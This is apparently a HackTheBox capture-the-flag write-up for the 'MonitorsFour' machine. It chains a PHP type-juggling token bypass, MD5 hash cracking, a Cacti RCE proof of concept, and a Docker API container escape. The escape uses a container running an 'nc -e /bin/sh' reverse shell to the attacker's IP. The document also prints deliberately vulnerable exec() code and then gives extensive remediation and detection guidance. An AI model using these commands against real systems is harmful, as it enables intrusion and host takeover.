# HackTheBox Machine: MonitorsFour
[← Back to Easy Machines](../readme.md) | [← Back to HTB Root](../../readme.md)
**PHP Type Juggling & Docker Escape Challenge**

## Machine Overview
Real-world penetration test chain demonstrating API vulnerability exploitation, credential cracking, web application RCE, and containerized environment escape. Progresses from PHP loose comparison flaw to privileged access via Docker daemon exposure.

**Difficulty:** Easy | **Status:** Active | **Platform:** HackTheBox Machines | **OS:** Linux (Docker Container) | **Type:** Multi-stage Exploitation

---

## High-Level Attack Chain

1. **API Enumeration** → Discover PHP type juggling vulnerability
2. **Token Bypass** → Exploit loose comparison (0e notation = magic hash)
3. **Credential Extraction** → Leak and crack MD5 hashes
4. **Web RCE** → Exploit Cacti application vulnerability (CVE-2025-24367)
5. **Container Escape** → Abuse exposed Docker daemon for host access
6. **Privilege Escalation** → Root access via bind mount exploitation

---

## Methodology

### Phase 1: Reconnaissance & Enumeration
- DNS and IP configuration
- Port scanning to identify services
- Web application discovery (dirsearch)
- Subdomain fuzzing to locate additional services
- Environment variable leakage analysis

### Phase 2: API Vulnerability Discovery
- API endpoint identification at `/user?token=`
- PHP loose comparison testing (magic hashes)
- Fuzzing token parameter with payload wordlists
- Identifying valid bypass tokens

### Phase 3: Data Exfiltration & Cracking
- Extracting user credentials via API
- MD5 hash collection and cracking (hashcat/John)
- Identifying valid credentials for secondary services

### Phase 4: Application Exploitation
- Cacti service enumeration
- CVE-2025-24367 exploitation (auth-based RCE)
- Reverse shell payload delivery
- Initial access as www-data user

### Phase 5: Container Escape & Privilege Escalation
- Internal network scanning within container
- Docker daemon API discovery (port 2375)
- Unauthenticated Docker API exploitation
- Malicious container creation with bind mounts
- Host filesystem access and root shell

---

## Technical Details

### PHP Type Juggling Vulnerability

Modern PHP 8.3.27 uses loose equality (`==`) comparison operator, treating strings beginning with `0e` followed by digits as scientific notation (0 = zero).

**Vulnerable Code Pattern:**
```php
if ($provided_token == $expected_token) {
    // Access granted
}
```

**Exploit:**
- Magic hash: `0e123456789...` 
- When hashed with MD5: `0e` prefix + digits = matches any other `0e` hash
- Both evaluate to zero mathematically

**Payload Discovery:**
```bash
ffuf -c -u "http://monitorsfour.htb/user?token=FUZZ" \
     -w php_loose_comparison.txt -fw 4
```

---

### Credential Extraction & Cracking

**API Data Dump:**
```bash
curl "http://monitorsfour.htb/user?token=0e1234567"
```

**Response:**
```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "standard user"
  }
]
```

**Hash Cracking:**
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Result: mwatson:wonderful1
```

---

### Cacti Application RCE (CVE-2025-24367)

**Affected Version:** Cacti v1.2.28

**Exploitation Steps:**

1. **Subdomain Discovery:**
```bash
ffuf -c -u "http://monitorsfour.htb/" \
     -H "Host: FUZZ.monitorsfour.htb" \
     -w subdomains-top1million-20000.txt -fw 3
# Discovers: cacti.monitorsfour.htb
```

2. **Cacti Login:**
```bash
curl -X POST http://cacti.monitorsfour.htb/auth \
     -d "user=mwatson&pass=wonderful1"
```

3. **PoC Exploitation:**
```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC

# Start reverse shell listener
nc -lnvp 60001

# Run exploit
python exploit.py -u mwatson -p wonderful1 \
                  -url http://cacti.monitorsfour.htb \
                  -i 10.10.14.47 -l 60001
```

**Result:** Reverse shell as `www-data` user inside Docker container

---

### Docker Daemon Escape (CVE-2025-9074)

**Container Limitations:**
```bash
www-data@821fbd6a43fa:~/html/cacti$ hostname
821fbd6a43fa

www-data@821fbd6a43fa:~/html/cacti$ cat /etc/resolv.conf
nameserver 127.0.0.11
nameserver 192.168.65.7
```

**Exposed Docker API:** 192.168.65.7:2375 (unauthenticated)

**Internal Port Scan:**
```bash
for p in 21 22 53 80 443 445 2375 2376 3306; do
  (timeout 0.3 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) \
    && echo "OPEN: $p" || echo -n "."
done
```

**Result:** Port 2375 (Docker API) is open

**Enumerate Docker Images:**
```bash
curl -s http://192.168.65.7:2375/images/json
# Returns: docker_setup-nginx-php:latest
```

**Container Escape via Bind Mount:**

1. **Create malicious container JSON:**
```json
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/sh", "-c", "nc -e /bin/sh 10.10.14.47 60002"],
  "HostConfig": {
    "Binds": ["/host_root:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

2. **Create container via API:**
```bash
curl -H "Content-Type: application/json" \
     -d @create_container.json \
     http://192.168.65.7:2375/containers/create \
     -o resp.json

cat resp.json
# {"Id":"26d70bac22282409918b13cd2f4169200ac452ae6198468edec4c7a2ba52046b"...}

cid=26d70bac22282409918b13cd2f4169200ac452ae6198468edec4c7a2ba52046b
```

3. **Start container and obtain root shell:**
```bash
curl -X POST http://192.168.65.7:2375/containers/$cid/start

# Listener receives connection as root
nc -lnvp 60002
root@732fe8bf4ee8:/# whoami
root

root@732fe8bf4ee8:/# cat /host_root/Users/Administrator/Desktop/root.txt
f448127512...
```

---

## Flag Locations

| Flag | Location | Access Method |
|------|----------|----------------|
| **User Flag** | `/home/marcus/user.txt` | Read via www-data container shell after Cacti RCE |
| **Root Flag** | `/root/root.txt` (host) | Read via Docker escape shell from `/host_root/Users/Administrator/Desktop/` |

---

## Key Vulnerabilities & CVEs

| Vulnerability | CVE | Impact | Mitigation |
|---------------|-----|--------|-----------|
| PHP Loose Comparison | Logic Flaw | Auth bypass via type juggling | Use strict comparison (`===`) |
| Cacti Auth RCE | CVE-2025-24367 | Remote code execution | Update Cacti to patched version |
| Docker API Exposure | CVE-2025-9074 | Container escape to host | Disable/secure Docker API socket |
| Bind Mount Abuse | Docker Feature | Unrestricted host filesystem access | Implement Docker security policies |

---

## Tools & Techniques

**Reconnaissance:**
- `rustscan` - Fast port scanning
- `dirsearch` - Web directory enumeration
- `ffuf` - Subdomain fuzzing
- `curl` - API testing and exploitation

**Exploitation:**
- `hashcat` / `John the Ripper` - Hash cracking
- Custom Python PoCs - CVE-2025-24367 exploitation
- `nc` (netcat) - Reverse shell handling

**Privilege Escalation:**
- Docker API (`curl`) - Container manipulation
- Bind mount exploitation - Host filesystem access

---

## Lessons Learned

1. **Secure Type Handling:** Always use strict comparison in authentication logic
2. **API Security:** Require authentication for all endpoints returning sensitive data
3. **Secure Default Credentials:** Cacti default passwords must be enforced at installation
4. **Container Security:**
   - Never expose Docker daemon API without authentication
   - Implement Docker AppArmor/SELinux profiles
   - Restrict bind mount capabilities
   - Run containers with minimal privileges
5. **Defense in Depth:** Single vulnerability chains into complete system compromise

---

## 🛡️ Detailed Remediation & Defense

### 1. PHP Type Juggling Fix

#### INSECURE CODE ❌
```php
// Authentication endpoint - VULNERABLE
$token = $_GET['token'];
$valid_token = "5d41402abc4b2a76b9719d911017c592"; // MD5 of "hello"

if ($token == $valid_token) {  // Loose comparison!
    $_SESSION['authenticated'] = true;
    echo json_encode(['status' => 'authenticated']);
} else {
    http_response_code(401);
    echo json_encode(['status' => 'unauthorized']);
}
```

**Why it's vulnerable:**
- PHP treats `0e123456...` as scientific notation (= 0)
- Loose comparison (`==`) triggers type coercion
- Attacker sends `token=0` → evaluated as `0 == 0e...` → `true`

#### SECURE CODE ✅
```php
// Authentication endpoint - SECURE
$token = $_GET['token'];
$valid_token = "5d41402abc4b2a76b9719d911017c592"; // MD5 of "hello"

// Option 1: Strict comparison (===)
if ($token === $valid_token) {
    $_SESSION['authenticated'] = true;
    echo json_encode(['status' => 'authenticated']);
} else {
    http_response_code(401);
    echo json_encode(['status' => 'unauthorized']);
}

// Option 2: Using hash_equals() (constant-time comparison)
if (hash_equals($token, $valid_token)) {
    $_SESSION['authenticated'] = true;
    echo json_encode(['status' => 'authenticated']);
} else {
    http_response_code(401);
    echo json_encode(['status' => 'unauthorized']);
}
```

#### Implementation in Real Application
```php
<?php
// config/Authentication.php
class Authentication {
    private $db;
    
    public function __construct($db) {
        $this->db = $db;
    }
    
    // SECURE: Validate token with proper checks
    public function validateToken($token) {
        // 1. Strict type checking
        if (!is_string($token) || empty($token)) {
            return false;
        }
        
        // 2. Length validation (prevent bypass attempts)
        if (strlen($token) !== 32) { // MD5 hash length
            return false;
        }
        
        // 3. Retrieve stored token from database
        $stmt = $this->db->prepare("SELECT token FROM api_tokens WHERE token = ?");
        $stmt->execute([$token]);
        $result = $stmt->fetch();
        
        // 4. Use hash_equals for constant-time comparison
        return $result && hash_equals($result['token'], $token);
    }
}

// Usage
$auth = new Authentication($db);
if ($auth->validateToken($_GET['token'] ?? '')) {
    // User is authenticated
} else {
    // Reject request
    http_response_code(401);
}
?>
```

#### Detection & Monitoring
```bash
# Log API authentication attempts
tail -f /var/log/apache2/access.log | grep "api/user"

# Monitor for suspicious token values
grep -E "token=(0|0e|0E)" /var/log/apache2/access.log

# Alert on multiple failed auth attempts
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | awk '$1 > 10'
```

---

### 2. Cacti CVE-2025-24367 Remediation

#### INSECURE CODE ❌
```php
// Cacti graph.php - VULNERABLE (simplified)
$graph_id = $_GET['local_graph_id'];
$command_param = $_GET['command'];

// Direct command execution - CRITICAL FLAW!
$cmd = "cacti_graph.sh --id=" . $graph_id . " --cmd=" . $command_param;
exec($cmd, $output);
echo implode("\n", $output);
```

#### SECURE CODE ✅
```php
// Cacti graph.php - SECURE
$graph_id = $_GET['local_graph_id'];
$command_param = $_GET['command'];

// Option 1: Input validation with whitelist
$allowed_commands = ['render', 'export', 'delete'];
if (!in_array($command_param, $allowed_commands)) {
    die('Invalid command');
}

// Option 2: Escape shell arguments
$safe_id = escapeshellarg($graph_id);
$safe_cmd = escapeshellarg($command_param);
$cmd = "cacti_graph.sh --id={$safe_id} --cmd={$safe_cmd}";
exec($cmd, $output);

// Option 3: Use ProcessBuilder instead of shell
$process = new Symfony\Component\Process\Process([
    'cacti_graph.sh',
    '--id=' . $graph_id,
    '--cmd=' . $command_param
]);
$process->run();
if (!$process->isSuccessful()) {
    throw new ProcessFailedException($process);
}
echo $process->getOutput();
```

#### Remediation Steps
```bash
# 1. Update Cacti to patched version
apt-get update
apt-get install cacti=1.2.29+  # Or later

# 2. Verify update
cacti --version

# 3. Review recent access logs for exploitation attempts
grep -i "graph.php" /var/log/apache2/access.log | grep "command="

# 4. Reset all API tokens (potential compromise)
mysql -u cacti -p cacti -e "DELETE FROM api_tokens;"

# 5. Check for web shells
find /var/www/cacti -name "*.php" -newermt "2025-12-01" -ls

# 6. Implement WAF rules (ModSecurity)
SecRule ARGS:command "@rx (?:system|exec|shell_exec)" "id:1000,phase:2,deny,log"
```

#### Detection & Monitoring
```bash
# Monitor for RCE attempts in access logs
grep -E "(command=|system|exec|bash|sh)" /var/log/apache2/access.log

# Alert on graph.php with unusual parameters
grep "graph.php" /var/log/apache2/access.log | grep -v "render\|export\|delete"

# Monitor web server process creation (spawning shells)
auditctl -w /var/www/cacti/graph.php -p x

# Real-time IDS detection
suricata -r cacti_requests.pcap -c /etc/suricata/suricata.yaml
```

---

### 3. Docker API Exposure Remediation

#### INSECURE DOCKER CONFIGURATION ❌
```bash
# Running Docker daemon with TCP socket (VULNERABLE)
dockerd -H tcp://0.0.0.0:2375 &

# Exposes API to entire network
curl http://any-attacker:2375/v1.24/containers/json
```

#### SECURE DOCKER CONFIGURATION ✅
```bash
# Option 1: Use Unix socket only (DEFAULT - SAFE)
dockerd -H unix:///var/run/docker.sock

# Option 2: If TCP required, use TLS authentication
dockerd -H tcp://127.0.0.1:2376 \
  --tlsverify \
  --tlscacert=/path/to/ca.pem \
  --tlscert=/path/to/server-cert.pem \
  --tlskey=/path/to/server-key.pem

# Option 3: Firewall-only exposure (last resort)
dockerd -H tcp://127.0.0.1:2375  # Local only
# Then use SSH tunnel for remote access
ssh -L 2375:127.0.0.1:2375 user@docker-host
```

#### Docker Daemon Security Hardening
```bash
# 1. Review Docker socket permissions
ls -la /var/run/docker.sock
# Should be: srw-rw---- 1 root docker

# 2. Add users to docker group (carefully!)
usermod -aG docker www-data
# ⚠️ WARNING: Users in docker group can escalate to root

# 3. Enable Docker daemon logging
cat > /etc/docker/daemon.json << 'EOF'
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "debug": false,
  "live-restore": true,
  "icc": false,
  "userns-remap": "default"
}
EOF

systemctl restart docker

# 4. Implement namespace remapping (user namespaces)
# This isolates container root from host root
echo "dockremap:100000:65536" >> /etc/subuid
echo "dockremap:100000:65536" >> /etc/subgid

# 5. Enable Seccomp profiles
# Restrict syscalls available to containers
docker run --security-opt seccomp=/path/to/seccomp.json image

# 6. Scan running containers for exposed API access
netstat -tulpn | grep 2375
ss -tulpn | grep docker
```

#### Detection & Monitoring
```bash
# Check for suspicious Docker API access
auditctl -w /var/run/docker.sock -p w

# Monitor container creation
docker events --filter 'type=container' --format '{{.Time}}: {{.Action}}'

# Alert on privileged containers
docker ps --format "{{.ID}}\t{{.Names}}\t{{json .HostConfig.Privileged}}" \
  | grep true

# Check mounted volumes
docker inspect <container_id> | grep Mounts -A 10

# Log Docker daemon startup
journalctl -u docker --follow
```

---

### 4. Container & Volume Security

#### INSECURE CONTAINER LAUNCH ❌
```bash
# Running with full privileges and host mount (DANGEROUS!)
docker run --privileged \
  -v /:/host_root \
  -v /root/.ssh:/ssh_keys \
  alpine /bin/sh
```

#### SECURE CONTAINER LAUNCH ✅
```bash
# Security-hardened container launch
docker run \
  --read-only \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges:true \
  --security-opt="apparmor=docker-default" \
  --user 1000:1000 \
  --memory=512m \
  --memory-swap=512m \
  --cpus=1 \
  --pids-limit=100 \
  --tmpfs /tmp:noexec,nodev,nosuid \
  --tmpfs /run:noexec,nodev,nosuid \
  --healthcheck=CMD curl localhost:8080 \
  myapp:latest
```

#### Kubernetes Pod Security Policy
```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  allowedCapabilities:
    - NET_BIND_SERVICE
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  # NO hostPath allowed!
  runAsUser:
    rule: 'MustRunAsNonRoot'
  runAsGroup:
    rule: 'MustRunAs'
    ranges:
      - min: 1000
        max: 65535
  fsGroup:
    rule: 'MustRunAs'
    ranges:
      - min: 1000
        max: 65535
  readOnlyRootFilesystem: true
  seLinux:
    rule: 'MustRunAs'
    seLinuxOptions:
      level: 's0:c123,c456'
```

---

### 5. Architecture - How It Should Have Been Designed

#### SECURE ARCHITECTURE DIAGRAM
```
┌─────────────────────────────────────────────────────────────┐
│                        Internet Users                        │
└────────┬─────────────────────────────────────────────────────┘
         │
    ┌────▼─────────────────────────────────────────────────┐
    │         WAF / Reverse Proxy (ModSecurity)             │
    │         - Input validation                             │
    │         - Rate limiting                                │
    │         - SQL injection prevention                     │
    └────┬──────────────────────────────────────────────────┘
         │
    ┌────▼──────────────────────────────────────────────┐
    │    Application Container (Non-root user)          │
    │    - Cacti (1.2.29+ patched)                      │
    │    - PHP with strict comparison auth              │
    │    - No shell access needed                       │
    │    - Read-only filesystem (except /tmp)           │
    │    - Network isolation                            │
    └────┬───────────────────────────────────────────┬──┘
         │                                           │
    Docker Network (Isolated)                   Secrets Vault
    - No port 2375 exposure                    - API tokens
    - TLS-only communication                   - Database creds
    - Network policies enforced                 - SSH keys
         │                                           │
    ┌────▼──────────────────────────────────────────▼──────┐
    │        Database Container (MySQL/PostgreSQL)          │
    │        - Separate database user/password              │
    │        - Restricted queries only                      │
    │        - No system command execution                  │
    │        - Encrypted connections (TLS)                  │
    └───────────────────────────────────────────────────────┘
```

#### Environment Variable Management (SECURE)
```bash
# ❌ INSECURE: Storing secrets in .env file
cat > .env << EOF
DB_PASSWORD=wonderful1
API_SECRET=abc123def456
DOCKER_HOST=tcp://localhost:2375
EOF
docker run --env-file .env myapp

# ✅ SECURE: Using secrets management
# Docker Secrets (Swarm mode)
echo "wonderful1" | docker secret create db_password -
docker service create \
  --secret db_password \
  --secret api_secret \
  myapp

# Kubernetes Secrets
kubectl create secret generic db-credentials \
  --from-literal=password=wonderful1
kubectl create secret generic api-secret \
  --from-literal=key=abc123def456

# HashiCorp Vault
vault write secret/data/myapp \
  username="dbuser" \
  password="wonderful1"
```

---

### 6. Comprehensive Security Checklist

#### Pre-Deployment
- [ ] Code review completed with security focus
- [ ] Vulnerability scanning (SAST) passed
- [ ] Dependency audit (npm audit, composer audit) clean
- [ ] SQL injection tests passed
- [ ] XSS protection verified
- [ ] CSRF tokens implemented
- [ ] Authentication strictly compared (===, hash_equals)

#### Docker Security
- [ ] Docker API socket is Unix-only or TLS-protected
- [ ] No privileged containers in production
- [ ] No host filesystem mounts (no -v /:/container)
- [ ] Containers run as non-root users
- [ ] Read-only filesystems where possible
- [ ] Resource limits set (memory, CPU)
- [ ] Security options enabled (--security-opt)
- [ ] Container images scanned for vulnerabilities

#### Monitoring & Alerting
- [ ] Access logs monitored for suspicious patterns
- [ ] Failed authentication attempts logged
- [ ] Unusual API calls alerted
- [ ] Container creation events logged
- [ ] Docker daemon access audited
- [ ] Web application firewall deployed
- [ ] SIEM configured with security rules
- [ ] Daily log review process established

#### Incident Response
- [ ] Incident response plan documented
- [ ] Contact list for security team
- [ ] Backup/recovery procedures tested
- [ ] Log retention policy (90 days minimum)
- [ ] Forensics tools available
- [ ] Post-incident review process

---

## Score
**100% Complete** ✓
Both user and root flags captured. Full attack chain executed successfully.

---

**Completion Date:** December 26, 2025  
**Machine Difficulty:** Easy ⭐⭐  
**OS:** Linux (Docker)  
**Time to Complete:** 1-2 hours  
**Status:** Active (Current Lab)  
**Key Learning:** Multi-stage exploitation, container escape, API security

---

[← Back to Easy Machines](../readme.md) | [← Back to HTB Root](../../readme.md)

---

## Completion Badge
<a href="https://labs.hackthebox.com/achievement/machine/2991649/814" target="_blank">HTB Achievement - MonitorsFour</a>
